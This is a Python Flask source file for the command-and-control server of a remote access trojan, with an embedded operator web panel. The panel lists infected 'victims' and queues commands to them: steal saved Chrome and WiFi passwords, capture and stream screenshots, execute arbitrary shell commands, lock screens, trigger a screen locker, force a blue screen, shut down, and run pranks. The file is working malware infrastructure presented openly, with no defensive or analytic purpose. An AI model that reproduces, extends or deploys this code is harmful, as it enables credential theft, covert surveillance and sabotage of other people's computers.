from flask import Flask, request, jsonify
import time
import base64

app = Flask(__name__)

clients = {}
commands = {}
notifications = []

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    client_id = str(int(time.time() * 1000))
    ip = request.remote_addr
    
    clients[client_id] = {
        "hostname": data.get("hostname"),
        "username": data.get("username"),
        "os": data.get("os"),
        "ip": ip,
        "country": ip,
        "last_seen": time.time(),
        "last_screenshot": "",
        "sysinfo": {},
        "chrome_data": "",
        "wifi_data": "",
        "exec_result": ""
    }
    commands[client_id] = []
    notifications.append({
        "text": f"🟢 {data.get('hostname')} connected",
        "time": time.strftime("%H:%M:%S")
    })
    return jsonify({"id": client_id})

@app.route('/data/<client_id>', methods=['POST'])
def receive_data(client_id):
    if client_id in clients:
        data = request.json
        data_type = data.get("type")
        if data_type in ["screenshot", "stream_frame"]:
            clients[client_id]["last_screenshot"] = data.get("data", "")
        elif data_type == "sysinfo":
            clients[client_id]["sysinfo"] = data.get("data", {})
        elif data_type == "chrome_passwords":
            clients[client_id]["chrome_data"] = data.get("data", "")
        elif data_type == "wifi_passwords":
            clients[client_id]["wifi_data"] = data.get("data", "")
        elif data_type == "exec_result":
            clients[client_id]["exec_result"] = data.get("data", "")
        clients[client_id]["last_seen"] = time.time()
    return jsonify({"status": "ok"})

@app.route('/screenshot/<client_id>')
def get_screenshot(client_id):
    if client_id in clients and clients[client_id].get("last_screenshot"):
        try:
            img_data = base64.b64decode(clients[client_id]["last_screenshot"])
            return img_data, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache'}
        except:
            pass
    return "no", 404

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    if client_id in commands and commands[client_id]:
        return jsonify(commands[client_id].pop(0))
    return jsonify({"command": "ping"})

@app.route('/clients', methods=['GET'])
def get_clients():
    result = {}
    for cid, info in clients.items():
        if time.time() - info["last_seen"] < 60:
            result[cid] = {
                "hostname": info["hostname"],
                "username": info["username"],
                "os": info["os"],
                "ip": info.get("ip", ""),
                "country": info.get("country", ""),
                "has_screenshot": bool(info.get("last_screenshot")),
                "sysinfo": info.get("sysinfo", {}),
                "chrome_data": info.get("chrome_data", ""),
                "wifi_data": info.get("wifi_data", ""),
                "exec_result": info.get("exec_result", "")
            }
    return jsonify(result)

@app.route('/send_command/<client_id>', methods=['POST'])
def add_command(client_id):
    if client_id in commands:
        cmd = request.json
        command = cmd.get("command")
        times = 3 if command in ["lock", "unlock", "winlocker", "shutdown", "restart", "bsod"] else 1
        for _ in range(times):
            commands[client_id].append(cmd)
    return jsonify({"status": "ok"})

@app.route('/notifications')
def get_notifications():
    return jsonify(notifications[-20:])

@app.route('/')
def home():
    return """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Control Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:Arial,sans-serif;font-size:14px;height:100vh;display:flex}
.sidebar{width:260px;background:#161b22;border-right:1px solid #30363d;display:flex;flex-direction:column}
.sidebar-header{padding:16px;border-bottom:1px solid #30363d}
.sidebar-header h1{font-size:16px;color:#58a6ff}
.sidebar-header .status{font-size:12px;color:#3fb950;margin-top:4px}
.notifications{max-height:120px;overflow-y:auto;padding:8px;border-bottom:1px solid #30363d}
.notification{background:#0d1117;padding:8px;margin-bottom:4px;border-radius:6px;font-size:11px;border-left:3px solid #3fb950}
.client-list{flex:1;overflow-y:auto;padding:8px}
.client-item{padding:12px;margin-bottom:4px;border-radius:6px;cursor:pointer;border:1px solid transparent}
.client-item:hover{background:#1c2128}
.client-item.active{border-color:#58a6ff;background:#1c2128}
.client-item .hostname{font-weight:600;color:#58a6ff;font-size:13px}
.client-item .meta{font-size:11px;color:#8b949e;margin-top:2px}
.dot{display:inline-block;width:6px;height:6px;background:#3fb950;border-radius:50%;margin-right:6px}
.main-content{flex:1;display:flex;flex-direction:column;min-width:0}
.toolbar{padding:10px 16px;border-bottom:1px solid #30363d;display:flex;gap:4px;flex-wrap:wrap;background:#161b22}
.toolbar button{padding:5px 12px;border:1px solid #30363d;border-radius:6px;background:#0d1117;color:#c9d1d9;font-size:12px;cursor:pointer;white-space:nowrap}
.toolbar button:hover{background:#30363d}
.toolbar button.green{color:#3fb950;border-color:#3fb950}
.toolbar button.green:hover{background:#3fb950;color:#000}
.toolbar button.red{color:#f85149;border-color:#f85149}
.toolbar button.red:hover{background:#f85149;color:#fff}
.toolbar button.funny{color:#d2991d;border-color:#d2991d}
.toolbar button.funny:hover{background:#d2991d;color:#000}
.separator{width:100%;height:1px;background:#30363d;margin:4px 0}
.section-label{width:100%;font-size:10px;color:#d2991d;font-weight:600;padding:2px 0}
.content-area{flex:1;display:flex;padding:8px;gap:8px;overflow:hidden}
.panel{background:#161b22;border:1px solid #30363d;border-radius:6px}
.screenshot-panel{flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden}
.screenshot-panel img{max-width:100%;max-height:100%;object-fit:contain}
.placeholder{color:#8b949e;font-size:14px;text-align:center;padding:20px}
.info-panel{width:350px;flex-shrink:0;padding:16px;overflow-y:auto}
.info-panel h3{font-size:13px;color:#58a6ff;margin-bottom:8px;margin-top:16px}
.info-panel h3:first-child{margin-top:0}
.info-row{display:flex;padding:3px 0;font-size:12px}
.info-label{color:#8b949e;width:90px;flex-shrink:0}
.info-value{color:#c9d1d9}
pre{background:#0d1117;padding:8px;border-radius:6px;font-size:11px;color:#3fb950;white-space:pre-wrap;max-height:180px;overflow-y:auto}
.console-panel{width:300px;flex-shrink:0;display:flex;flex-direction:column}
.console-header{padding:8px 12px;font-size:11px;font-weight:600;color:#58a6ff;border-bottom:1px solid #30363d}
.console-output{flex:1;overflow-y:auto;padding:8px;font-family:monospace;font-size:11px;color:#3fb950}
.console-input{display:flex;border-top:1px solid #30363d}
.console-input input{flex:1;background:transparent;border:none;color:#c9d1d9;padding:8px 12px;font-family:monospace;font-size:12px;outline:none}
.console-input button{background:#58a6ff;color:#000;border:none;padding:8px 14px;cursor:pointer;font-weight:600}
.log-entry{font-size:10px;padding:1px 0}
.log-entry .time{color:#58a6ff;margin-right:6px}
</style></head><body>
<div class="sidebar">
<div class="sidebar-header"><h1>Control Panel</h1><div class="status">● Online</div></div>
<div class="notifications" id="notifications"></div>
<div class="client-list" id="clientList"><div class="placeholder">Waiting...</div></div>
</div>
<div class="main-content">
<div class="toolbar">
<button onclick="sendCmd('screenshot')">📸 Screenshot</button>
<button class="green" onclick="startStream()">📡 Stream</button>
<button class="red" onclick="stopStream()">⏹ Stop</button>
<button onclick="sendCmd('sysinfo')">💻 Info</button>
<button onclick="sendCmd('steal_chrome')">🔑 Chrome</button>
<button onclick="sendCmd('steal_wifi')">📶 WiFi</button>
<button class="green" onclick="sendCmd('lock')">🔒 Lock</button>
<button onclick="sendCmd('unlock')">🔓 Unlock</button>
<button class="red" onclick="sendCmd('shutdown')">⏻ Off</button>
<button class="red" onclick="sendCmd('restart')">🔄 Reboot</button>
<button onclick="sendMsg()">💬 Msg</button>
<button class="red" onclick="sendCmd('winlocker')">🚫 WinLock</button>
<button class="red" onclick="sendCmd('bsod')">⚠ BSOD</button>
<div class="separator"></div>
<div class="section-label">😂 Funny</div>
<button class="funny" onclick="sendCmd('funny_msg')">😂 Msg</button>
<button class="funny" onclick="sendCmd('crazy_screen')">🤪 Screen</button>
<button class="funny" onclick="sendCmd('crazy_mouse')">🖱 Mouse</button>
<button class="funny" onclick="sendCmd('rickroll')">🎵 RickRoll</button>
<button class="funny" onclick="sendCmd('draw')">🎨 Draw</button>
<button class="funny" onclick="sendCmd('beep')">🔊 Beep</button>
<button class="funny" onclick="sendCmd('cdrom')">💿 CD</button>
<button class="funny" onclick="sendCmd('type_funny')">⌨️ Type</button>
</div>
<div class="content-area">
<div class="panel screenshot-panel" id="screenPanel"><div class="placeholder">Select victim</div></div>
<div class="panel info-panel">
<h3>💻 System Info</h3><div id="sysinfoContent"></div>
<h3>📄 Output</h3><pre id="execOutput"></pre>
<h3>🔑 Chrome</h3><pre id="chromeContent"></pre>
<h3>📶 WiFi</h3><pre id="wifiContent"></pre>
</div>
<div class="panel console-panel">
<div class="console-header">📋 Console</div>
<div class="console-output" id="console"></div>
<div class="console-input"><input type="text" id="cmdInput" placeholder="Command..." onkeydown="if(event.key==='Enter')execCmd()"><button onclick="execCmd()">▶</button></div>
</div>
</div>
</div>
<script>
var selectedClient=null;
var streamInterval=null;
function log(msg){var t=new Date().toLocaleTimeString();var c=document.getElementById('console');c.innerHTML+='<div class="log-entry"><span class="time">['+t+']</span>'+msg+'</div>';c.scrollTop=c.scrollHeight}
function updateAll(){fetch('/clients').then(function(r){return r.json()}).then(function(data){var html='';for(var id in data){var c=data[id];var active=selectedClient===id?' active':'';html+='<div class="client-item'+active+'" onclick="selectClient(\''+id+'\')"><div class="hostname"><span class="dot"></span>'+c.hostname+'</div><div class="meta">👤 '+c.username+' | 🌐 '+c.ip+' | 💻 '+c.os+'</div></div>'}document.getElementById('clientList').innerHTML=html||'<div class="placeholder">No victims</div>';if(selectedClient&&data[selectedClient]){var c=data[selectedClient];if(c.has_screenshot&&streamInterval){var img=document.getElementById('screenPanel').querySelector('img');if(img){img.src='/screenshot/'+selectedClient+'?t='+Date.now()}else{document.getElementById('screenPanel').innerHTML='<img src="/screenshot/'+selectedClient+'">'}}if(c.sysinfo&&Object.keys(c.sysinfo).length>0){var h='';for(var k in c.sysinfo){h+='<div class="info-row"><span class="info-label">'+k+':</span><span class="info-value">'+c.sysinfo[k]+'</span></div>'}document.getElementById('sysinfoContent').innerHTML=h}if(c.chrome_data)document.getElementById('chromeContent').textContent=c.chrome_data;if(c.wifi_data)document.getElementById('wifiContent').textContent=c.wifi_data;if(c.exec_result)document.getElementById('execOutput').textContent=c.exec_result}});fetch('/notifications').then(function(r){return r.json()}).then(function(data){var h='';for(var i=data.length-1;i>=0;i--){h+='<div class="notification">'+data[i].text+'</div>'}document.getElementById('notifications').innerHTML=h})}
function selectClient(id){selectedClient=id;var items=document.querySelectorAll('.client-item');for(var i=0;i<items.length;i++){items[i].classList.remove('active')}event.target.closest('.client-item').classList.add('active');sendCmd('screenshot');setTimeout(updateAll,2000)}
function sendCmd(command){if(!selectedClient){alert('Select victim!');return}fetch('/send_command/'+selectedClient,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:command})})}
function startStream(){if(!selectedClient){return}sendCmd('stream_start');if(streamInterval)clearInterval(streamInterval);streamInterval=setInterval(function(){sendCmd('screenshot');setTimeout(updateAll,1500)},2000)}
function stopStream(){if(streamInterval)clearInterval(streamInterval);streamInterval=null;sendCmd('stream_stop')}
function execCmd(){var cmd=document.getElementById('cmdInput').value;if(cmd&&selectedClient){sendCmd('exec');fetch('/send_command/'+selectedClient,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'exec',cmd:cmd})});document.getElementById('cmdInput').value='';setTimeout(updateAll,3000)}}
function sendMsg(){if(!selectedClient){return}var msg=prompt('Message:');if(msg){sendCmd('message');fetch('/send_command/'+selectedClient,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'message',text:msg})})}}
setInterval(updateAll,2000);updateAll()
</script></body></html>"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
